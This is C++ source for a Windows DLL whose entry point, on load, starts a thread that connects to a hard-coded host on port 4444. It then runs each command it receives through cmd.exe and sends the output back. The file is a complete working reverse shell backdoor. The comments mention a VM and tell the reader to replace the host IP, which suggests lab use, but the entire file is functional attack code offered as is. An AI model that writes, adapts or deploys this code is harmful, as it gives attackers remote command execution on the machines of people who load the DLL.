#include "pch.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#pragma comment(lib, "ws2_32.lib")

// Execute a system command and return the output as a string
std::string ExecuteCommand(const char* command) {
    // Create an anonymous pipe to capture cmd.exe output
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;  // Child process can inherit
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "[x] CreatePipe failed.\r\n";
    }

    // Make sure the read end cannot be inherited by the child process
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // Prepare to run: cmd.exe /c <command>
    char cmdLine[1024];
    _snprintf_s(cmdLine, sizeof(cmdLine), _TRUNCATE, "cmd.exe /c %s", command);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    // Redirect the child process's stdout/stderr to hWrite
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = NULL;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Create the child process (cmd.exe /c ...)
    if (!CreateProcessA(
        NULL,         // Filename, can be NULL if using cmdLine
        cmdLine,      // Command line
        NULL, NULL,   // Default security attributes
        TRUE,         // Inherit handles
        0,            // No special creation flags
        NULL,         // Environment variables
        NULL,         // Working directory
        &si,
        &pi
    )) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return "[x] CreateProcess failed.\r\n";
    }

    // We no longer need the write end (used by the child process)
    CloseHandle(hWrite);

    // Read the child process output
    std::string result;
    const int BUF_SIZE = 512;
    char buffer[BUF_SIZE];
    DWORD bytesRead;
    while (true) {
        BOOL success = ReadFile(hRead, buffer, BUF_SIZE - 1, &bytesRead, NULL);
        if (!success || bytesRead == 0) break;
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    // Cleanup
    CloseHandle(hRead);

    // Wait for the child process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // If output isn't empty but doesn't end with a newline, add one
    if (!result.empty() && result.back() != '\n') {
        result += "\r\n";
    }

    return result;
}

// ========================================================

// Connect to the host, receive commands, execute them, and return the results
DWORD WINAPI ConnectToHost(LPVOID) {
    WSADATA wsa;
    SOCKET sock;
    sockaddr_in server;
    char buffer[1024];

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Match the same port as the host
    // Replace "192.168.56.1" with your actual host IP
    inet_pton(AF_INET, "192.168.56.1", &server.sin_addr);

    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Send an initial message (add a newline to separate it clearly)
    const char* initMsg = "VM Connected\r\n";
    send(sock, initMsg, (int)strlen(initMsg), 0);

    // Loop to receive commands and execute them
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) {
            // The host may have closed the connection
            break;
        }
        // If "exit" or "quit" is received, disconnect
        if (strcmp(buffer, "exit") == 0 || strcmp(buffer, "quit") == 0) {
            break;
        }

        // Execute the received command and get the result
        std::string cmdResult = ExecuteCommand(buffer);
        if (cmdResult.empty()) {
            cmdResult = "[!] No output.\r\n";
        }

        // Return the result to the host
        send(sock, cmdResult.c_str(), (int)cmdResult.size(), 0);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}

// ========================================================

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Create a new thread to handle network operations
        CreateThread(NULL, 0, ConnectToHost, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
